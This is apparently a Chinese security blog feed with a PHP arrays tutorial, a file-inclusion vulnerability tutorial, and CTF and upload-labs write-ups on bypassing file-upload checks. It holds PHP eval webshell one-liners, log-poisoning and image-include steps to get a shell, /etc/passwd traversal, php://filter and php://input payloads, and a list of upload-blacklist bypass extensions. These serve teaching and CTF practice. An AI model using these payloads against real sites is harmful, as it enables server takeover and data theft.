<span class="hljs-string">&quot;d&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="示例-6-复杂类型转换和覆盖的例子"><a href="#示例-6-复杂类型转换和覆盖的例子" class="headerlink" title="示例 6 复杂类型转换和覆盖的例子"></a><strong>示例 6 复杂类型转换和覆盖的例子</strong></h4><p>这个例子包括键名类型转换和元素覆盖的所有变化。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-number">1</span>    =&gt; <span class="hljs-string">&#x27;a&#x27;</span>,<br>    <span class="hljs-string">&#x27;1&#x27;</span>  =&gt; <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-comment">// 值 &quot;a&quot; 会被 &quot;b&quot; 覆盖</span><br>    <span class="hljs-number">1.5</span>  =&gt; <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-comment">// 值 &quot;b&quot; 会被 &quot;c&quot; 覆盖</span><br>    -<span class="hljs-number">1</span> =&gt; <span class="hljs-string">&#x27;d&#x27;</span>,<br>    <span class="hljs-string">&#x27;01&#x27;</span>  =&gt; <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-comment">// 由于这不是整数字符串，因此不会覆盖键名 1</span><br>    <span class="hljs-string">&#x27;1.5&#x27;</span> =&gt; <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-comment">// 由于这不是整数字符串，因此不会覆盖键名 1</span><br>    <span class="hljs-literal">true</span> =&gt; <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-comment">// 值 &quot;c&quot; 会被 &quot;g&quot; 覆盖</span><br>    <span class="hljs-literal">false</span> =&gt; <span class="hljs-string">&#x27;h&#x27;</span>,<br>    <span class="hljs-string">&#x27;&#x27;</span> =&gt; <span class="hljs-string">&#x27;i&#x27;</span>,<br>    <span class="hljs-literal">null</span> =&gt; <span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-comment">// 值 &quot;i&quot; 会被 &quot;j&quot; 覆盖</span><br>    <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-comment">// 值 “k” 的键名被分配为 2。这是因为之前最大的整数键是 1</span><br>    <span class="hljs-number">2</span> =&gt; <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-comment">// 值 &quot;k&quot; 会被 &quot;l&quot; 覆盖</span><br>);<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$array</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>以上示例会输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">array</span>(<span class="hljs-number">7</span>) &#123;<br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;g&quot;</span><br>  [-<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;d&quot;</span><br>  [<span class="hljs-string">&quot;01&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;e&quot;</span><br>  [<span class="hljs-string">&quot;1.5&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;f&quot;</span><br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;h&quot;</span><br>  [<span class="hljs-string">&quot;&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;j&quot;</span><br>  [<span class="hljs-number">2</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;l&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>数组单元可以通过 <code>array[key]</code> 语法来访问。</p><h4 id="示例-7-访问数组单元"><a href="#示例-7-访问数组单元" class="headerlink" title="示例 7 访问数组单元"></a><strong>示例 7 访问数组单元</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&quot;foo&quot;</span> =&gt; <span class="hljs-string">&quot;bar&quot;</span>,<br>    <span class="hljs-number">42</span>    =&gt; <span class="hljs-number">24</span>,<br>    <span class="hljs-string">&quot;multi&quot;</span> =&gt; <span class="hljs-keyword">array</span>(<br>         <span class="hljs-string">&quot;dimensional&quot;</span> =&gt; <span class="hljs-keyword">array</span>(<br>             <span class="hljs-string">&quot;array&quot;</span> =&gt; <span class="hljs-string">&quot;foo&quot;</span><br>         )<br>    )<br>);<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;foo&quot;</span>]);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$array</span>[<span class="hljs-number">42</span>]);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;multi&quot;</span>][<span class="hljs-string">&quot;dimensional&quot;</span>][<span class="hljs-string">&quot;array&quot;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>以上示例会输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;bar&quot;</span><br><span class="hljs-keyword">int</span>(<span class="hljs-number">24</span>)<br><span class="hljs-keyword">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;foo&quot;</span><br></code></pre></td></tr></table></figure><p><strong>注意</strong>:</p><p><strong>在 PHP 8.0.0 之前，方括号和花括号可以互换使用来访问数组单元（例如 <code>$array[42]</code> 和 <code>$array&#123;42&#125;</code> 在上例中效果相同）。 花括号语法在 PHP 7.4.0 中已弃用，在 PHP 8.0.0 中不再支持。</strong></p>]]></content>
    
    
    <categories>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>代码审计攻防世界</title>
    <link href="/2023/05/28/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    <url>/2023/05/28/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
    
    <content type="html"><![CDATA[<h3 id="Buy-a-lottery"><a href="#Buy-a-lottery" class="headerlink" title="Buy a lottery!"></a><strong>Buy a lottery!</strong></h3><p>进入到页面，发现需要玩小游戏得钱然后买flag，之前做过类似的题目直接修改金额即可，按照这个思路往下走</p><h4 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a><strong>源码泄露</strong></h4><p>直接给出了源码，有用的信息在api.php当中<br><img src="/img/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11.png" srcset="/img/loading.gif" lazyload><br>这里是弱比较只用比较值不用不比较类型，这里参考我的文章<strong>php运算符</strong><br>这里是把字符一个一个取出来进行比较所以我们只需要将设置的数组全部改为true即可</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含漏洞</title>
    <link href="/2023/05/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/05/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h3 id="文件包含漏洞描述"><a href="#文件包含漏洞描述" class="headerlink" title="文件包含漏洞描述"></a><strong>文件包含漏洞描述</strong></h3><p>程序在引用文件的时，引用的文件名，用户可控的情况，传入的文件名没有经过合理的校验或校验不严，从而操作了预想之外的文件，就有可能导致文件泄漏和恶意的代码注入。<br>程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这重文件调用的过程一般被称为文件包含。<br>程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。<br>几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在 PHP Web Application 中居多, 而在 JSP、ASPASP.NET 程序中却非常少，甚至没有，这是有些语言设计的弊端。在 PHP 中经常出现包含漏洞，但这并不意味这其他语言不存在。</p><h3 id="常见文件包含函数"><a href="#常见文件包含函数" class="headerlink" title="常见文件包含函数"></a><strong>常见文件包含函数</strong></h3><p>include():执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本继续执行<br>require():只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并且停止脚本<br>include_once()和require_once()则时在上面各自的基础上添加一条，若文件中代码已被包含则不会再次包含</p><h3 id="文件包含代码分析"><a href="#文件包含代码分析" class="headerlink" title="文件包含代码分析"></a><strong>文件包含代码分析</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$html</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]!=<span class="hljs-literal">null</span>)&#123;<br>    <span class="hljs-variable">$filename</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;include/<span class="hljs-subst">$filename</span>&quot;</span>;<br></code></pre></td></tr></table></figure><p>这里是GET传参，没有任何过滤带入到include函数中，include包含这个文件，引入到当前文件中，因此会造成文件包含漏洞</p><h3 id="文件包含漏洞及其利用方法"><a href="#文件包含漏洞及其利用方法" class="headerlink" title="文件包含漏洞及其利用方法"></a><strong>文件包含漏洞及其利用方法</strong></h3><p>文件包含漏洞，需要引入上传到网站目录，或是服务器内部的文件，而且是权限可读，才能引入进来，或者远程包含进来，但是需要条件</p><h4 id="本地包含etc-x2F-passwd"><a href="#本地包含etc-x2F-passwd" class="headerlink" title="本地包含etc&#x2F;passwd"></a><strong>本地包含etc&#x2F;passwd</strong></h4><p><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A01.png" srcset="/img/loading.gif" lazyload><br>..&#x2F;是上一级目录，&#x2F;etc&#x2F;passwd是linux的敏感文件记录了用户信息</p><h4 id="文件包含图片"><a href="#文件包含图片" class="headerlink" title="文件包含图片"></a><strong>文件包含图片</strong></h4><p>寻找网站上传点，把php恶意代码文件改成jpg上传到网站上，本地包含引入恶意代码，当文件被引入后，代码就被执行<br>&lt; ?php phpinfo();eval($_POST[‘cmd’]);?&gt; 保存为 shell.jpg上传格式到网站，再用文件包含漏洞引入图片成功执行代码<br><img src="/img/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB2.png" srcset="/img/loading.gif" lazyload></p><h4 id="包含日志文件getshell"><a href="#包含日志文件getshell" class="headerlink" title="包含日志文件getshell"></a><strong>包含日志文件getshell</strong></h4><p>中间件例如 iis 、apache、nginx 这些 web 中间件，都会记录访问日志，如果访问日志中或错误日志中，<br>存在有 php 代码，也可以引入到文件包含中。如果日志有 php 恶意代码，也可导致 getshell。<br>使用 burpsuite 访问 GET 填写 &lt; ?php phpinfo();eval($_POST[cmd]);?&gt;<br><img src="/img/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB3.png" srcset="/img/loading.gif" lazyload><br><strong>这里提一嘴如何快速查询文件以日志文件为例</strong> sudo find &#x2F;-name access.log<br><img src="/img/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB4.png" srcset="/img/loading.gif" lazyload><br><strong>我们可以看到里面存在一句话但是被编码了</strong><br>在linux 下日志文件权限默认是 root 而php 的权限是 www-data 一般情况下都是读取不了，如果是 windows 环境下是可以权限是允许的。<br>linux 默认的 apache 日志文件路径是<br>访问日志<br>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log<br>错误日志<br>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;error.log<br>把文件日志包含进来即可</p><h4 id="包含环境变量-getshell"><a href="#包含环境变量-getshell" class="headerlink" title="包含环境变量 getshell"></a><strong>包含环境变量 getshell</strong></h4><p>修改User-Agen填写php代码</p><h4 id="文件包含使用伪协议"><a href="#文件包含使用伪协议" class="headerlink" title="文件包含使用伪协议"></a><strong>文件包含使用伪协议</strong></h4><p><strong>什么是PHP伪协议</strong><br>PHP伪协议事实上就是支持的协议与封装协议</p><p><strong>常见的伪协议</strong><br>file:&#x2F;&#x2F; — 访问本地文件系统（使用绝对路径）<br>http:&#x2F;&#x2F; — 访问 HTTP(s) 网址<br>ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs<br>php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）<br>zlib:&#x2F;&#x2F; — 压缩流<br>data:&#x2F;&#x2F; — 数据（RFC 2397）<br>glob:&#x2F;&#x2F; — 查找匹配的文件路径模式<br>phar:&#x2F;&#x2F; — PHP 归档<br>ssh2:&#x2F;&#x2F; — Secure Shell 2<br>rar:&#x2F;&#x2F; — RAR<br>ogg:&#x2F;&#x2F; — 音频流<br>expect:&#x2F;&#x2F; — 处理交互式的流</p><p><strong>这里需要注意php.ini参数设置</strong><br>在 php.ini 里有两个重要的参数 allow_url_fopen、allow_url_include。<br>allow_url_fopen:默认值是 ON。允许 url 里的封装协议访问文件；<br>allow_url_include:默认值是 OFF。不允许包含 url 里的封装协议包含文件；</p><p><img src="/img/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB5.png" srcset="/img/loading.gif" lazyload></p><h5 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a><strong>php:&#x2F;&#x2F;input</strong></h5><p>php:&#x2F;&#x2F;input 可以访问请求的原始数据的只读流，将 post 请求的数据当作 php 代码执行。当传入的参数作<br>为文件名打开时，可以将参数设为 php:&#x2F;&#x2F;input,同时 post 想设置的文件内容，php 执行时会将 post 内容<br>当作文件内容。<br><img src="/img/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB6.png" srcset="/img/loading.gif" lazyload><br><strong>注：当 enctype&#x3D;”multipart&#x2F;form-data”，php:&#x2F;&#x2F;input 是无效的。</strong><br><strong>php.ini 条件是 allow_url_fopen &#x3D;ON allow_url_include&#x3D;ON</strong></p><h5 id="file-x2F-x2F-访问本地文件"><a href="#file-x2F-x2F-访问本地文件" class="headerlink" title="file:&#x2F;&#x2F; 访问本地文件"></a><strong>file:&#x2F;&#x2F; 访问本地文件</strong></h5><p>在本地包含漏洞里可以使用 file 协议，使用 file 协议可以读取本地文件<br><strong>绝对路径</strong><br><img src="/img/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB7.png" srcset="/img/loading.gif" lazyload><br><strong>相对路径</strong><br><img src="/img/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB8.png" srcset="/img/loading.gif" lazyload></p><h5 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a><strong>php:&#x2F;&#x2F;filter</strong></h5><p>php:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器</p><p>简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。</p><p><strong>php:&#x2F;&#x2F;filter</strong>可以获取指定文件源码。当它与包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。</p><p>协议参数<br><img src="/img/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB9.png" srcset="/img/loading.gif" lazyload><br>常用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=index.php</span><br>php:<span class="hljs-comment">//filter/resource=index.php</span><br></code></pre></td></tr></table></figure><p>利用filter协议读文件±，将index.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码<br>而使用的convert.base64-encode，就是一种过滤器。</p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件包含</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传buu</title>
    <link href="/2023/05/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0buu/"/>
    <url>/2023/05/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0buu/</url>
    
    <content type="html"><![CDATA[<h2 id="极客大挑战-2019-Upload1"><a href="#极客大挑战-2019-Upload1" class="headerlink" title="[极客大挑战 2019]Upload1"></a><strong>[极客大挑战 2019]Upload1</strong></h2><p>需要用到的知识<br>1、黑名单绕过<br>2、content-type绕过<br>3、一句话内容木马变更形式</p><p>一开始上传普通的php文件发现的标识<br><img src="/img/upload1.png" srcset="/img/loading.gif" lazyload><br>猜测是要修改conten-type进行抓包修改成image&#x2F;jpeg再次上传<br><img src="/img/upload2.png" srcset="/img/loading.gif" lazyload><br>这里应该是黑名单,使用burpsuite进行寻找可使用的脚本类型.phtml<br>.php .php5 .php4 .php3 .php2 .html .htm .phtml .pht .pHp .phP .pHp5 .pHp4 .pHp3 .pHp2 .Html .Htm .pHtml .jsp .jspa .jspx .jsw .jsv .jspf .jtml .jSp .jSpx .jSpa .jSw .jSv .jSpf .jHtml .asp .aspx .asa .asax .ascx .ashx .asmx .cer .aSp .aSpx .aSa .aSax .aScx .aShx .aSmx .cEr .sWf .swf .htacces<br><img src="/img/upload3.png" srcset="/img/loading.gif" lazyload><br>我开始使用的一句话木马是&lt; ?php eval($_POST[‘123’]);?&gt;，可以发现过滤了&lt;?这里自然而然就想到了另外一种一句吗木马。用script代替<br><img src="/img/upload4.png" srcset="/img/loading.gif" lazyload><br>这里发现还是有问题，所以应该对内容进行了检测，所以需要我们添加GIF89a最后发现上传成功，通常下载路径是upload，我们进入目录下可以发现上传的文件，并且可以成功访问<br><img src="/img/upload5.png" srcset="/img/loading.gif" lazyload><br>最后使用蚁剑连接并且找到flag</p><h4 id="插曲"><a href="#插曲" class="headerlink" title="插曲"></a>插曲</h4><p>在尝试绕过黑名单的时候，我首先想到了空格，然后又想到了’.’和::$DATA发现都不行，后来上传后才发现系统是linux前面几种都是针对windows，当然这里还有windows环境特征绕过也不行</p><h2 id="ACTF2020-新生赛-Upload1"><a href="#ACTF2020-新生赛-Upload1" class="headerlink" title="[ACTF2020 新生赛]Upload1"></a>[ACTF2020 新生赛]Upload1</h2><p>上传1.php后的界面<br><img src="/img/upload6.png" srcset="/img/loading.gif" lazyload><br>这里发现是前端验证<br>我们于是上传1.jpg文件再抓包改成1.php但是发现禁止上传，于是开始尝试后缀，发现1.phtml可以上传</p><h2 id="强网杯-2019-Upload1"><a href="#强网杯-2019-Upload1" class="headerlink" title="[强网杯 2019]Upload1"></a><strong>[强网杯 2019]Upload1</strong></h2><h3 id="摸索"><a href="#摸索" class="headerlink" title="摸索"></a><strong>摸索</strong></h3><p>进入题目发现一个登录页面和一个注册页面，注册后再进行登录，发现上传的地方。<br>尝试上传一句话木马，发现只能上传jpg的一句话木马，同时发现图片名称变成了MD5且后缀成了png，然后我就发现我寄了，然后就卑微看大佬的wp</p><h3 id="正题"><a href="#正题" class="headerlink" title="正题"></a><strong>正题</strong></h3><h4 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a><strong>源码泄露</strong></h4><p>大佬发现<a href="http://www.tar.gz目录下存在源码,这个需要使用工具扫描/">www.tar.gz目录下存在源码，这个需要使用工具扫描</a></p><h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a><strong>代码审计</strong></h4><p>查看<strong>tp5\application\web\controller</strong>目录下的四个文件<br>这里就发现反序列化的魔术函数_ _get _ _call  _ _construct _ _destruct</p><h5 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h5><p>_ _get:当调用或设置一个类及其父类方法中未定义的属性时被调用<br>_ _call:调用类不存在的方法时执行</p><p><img src="/img/upload7.png" srcset="/img/loading.gif" lazyload></p><h6 id="this的使用"><a href="#this的使用" class="headerlink" title="$this的使用"></a><strong>$this的使用</strong></h6><p>上代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getName</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>$user1&#x3D;new User();<br>$user1-&gt;name&#x3D;’leo’;<br>$user1-&gt;getName();&#x2F;&#x2F;这里会输出leo<br>$user2&#x3D;new User();<br>$user2-&gt;name&#x3D;’nick’;<br>$user2-&gt;getName();&#x2F;&#x2F;这里输出nick<br>所以$this就是用来引用内部属性的代号</p><h5 id="public-function-get-name"><a href="#public-function-get-name" class="headerlink" title="public function _ _get($name)"></a><strong>public function _ _get($name)</strong></h5><p>这个函数就是当访问一个不被访问或者不存在的属性的时候被引用，并且会返回属性的值 </p><h5 id="public-function-call-name-arguments"><a href="#public-function-call-name-arguments" class="headerlink" title="public function __call($name, $arguments)"></a><strong>public function __call($name, $arguments)</strong></h5><p>这个魔法函数就是在尝试调用一个不可访问或不存在的方法时自动被调用，这里的中括号的意思就是，获取变量name的值，当作属性名调用<br>$this-&gt;{name}在这里表示一个值，也就是方法的名字<br>$this-&gt;方法名($arguments)，这里调用方法名并且传参</p><p><img src="/img/upload8.png" srcset="/img/loading.gif" lazyload></p><h5 id="public-function-destruct"><a href="#public-function-destruct" class="headerlink" title="public function __destruct()"></a><strong>public function __destruct()</strong></h5>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>文件上传</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="/2023/05/22/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/05/22/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="文件上传漏洞简述"><a href="#文件上传漏洞简述" class="headerlink" title="文件上传漏洞简述"></a><strong>文件上传漏洞简述</strong></h2><p><strong>描述</strong><br>文件上传漏洞是指由于程序员未对上传的文件进行严格的验证和过滤，而导致的用户可以越过其本身权限向服务器上传可执行的动态脚本文件。如常见的头像上传，图片上传，oa 办公文件上传，媒体上传，允许用户上传文件，如果过滤不严格，恶意用户利用文件上传漏洞，上传有害的可以执行脚本文件到服务器中，可以获取服务器的权限，或进一步危害服务器。<br><strong>危害</strong><br>非法用户可以上传的恶意文件控制整个网站，甚至是控制服务器，这个恶意脚本文件，又被称为 webshell，上传 webshell 后门 很方便地查看服务器信息，查看目录，执行系统命令等。<br><strong>文件上传过程</strong><br>客户端 选择发送的文件-&gt;服务器接收-&gt;网站程序判断-&gt;临时文件-&gt;移动到指定的路径</p><h2 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a><strong>upload-labs</strong></h2><h3 id="前端绕过-labs-1"><a href="#前端绕过-labs-1" class="headerlink" title="前端绕过(labs-1)"></a><strong>前端绕过(labs-1)</strong></h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> file = document.<span class="hljs-title function_ invoke__">getElementsByName</span>(<span class="hljs-string">&#x27;upload_file&#x27;</span>)[<span class="hljs-number">0</span>].value;<br>    <span class="hljs-keyword">if</span> (file == <span class="hljs-literal">null</span> || file == <span class="hljs-string">&quot;&quot;</span>) &#123;<br>        <span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&quot;请选择要上传的文件!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-comment">//定义允许上传的文件类型</span><br>    <span class="hljs-keyword">var</span> allow_ext = <span class="hljs-string">&quot;.jpg|.png|.gif&quot;</span>;<br>    <span class="hljs-comment">//提取上传文件的类型</span><br>    <span class="hljs-keyword">var</span> ext_name = file.<span class="hljs-title function_ invoke__">substring</span>(file.<span class="hljs-title function_ invoke__">lastIndexOf</span>(<span class="hljs-string">&quot;.&quot;</span>));<span class="hljs-comment">//lastIndexOf从后往前检索，返回字符串位置，substring从返回的位置开始往后截取</span><br>    <span class="hljs-comment">//判断上传文件类型是否允许上传</span><br>    <span class="hljs-keyword">if</span> (allow_ext.<span class="hljs-title function_ invoke__">indexOf</span>(ext_name + <span class="hljs-string">&quot;|&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">var</span> errMsg = <span class="hljs-string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="hljs-string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;<br>        <span class="hljs-title function_ invoke__">alert</span>(errMsg);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br>&lt;form enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> onsubmit=<span class="hljs-string">&quot;return checkFile()&quot;</span>&gt;<span class="hljs-comment">//前端进行验证</span><br></code></pre></td></tr></table></figure><p><strong>方法一</strong><br>直接删除<strong>onsubmit&#x3D;”return checkFile()”</strong><br><strong>方法二</strong><br>抓包改包，例如需要上传的一句话文件为1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;123&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>我们先修改成1.jpg或者其他符合要求的文件名称然后再抓包将1.jpg改成1.php即可上传成功<br><img src="/img/upload-labs1.png" srcset="/img/loading.gif" lazyload></p><h3 id="content-type绕过-labs-2"><a href="#content-type绕过-labs-2" class="headerlink" 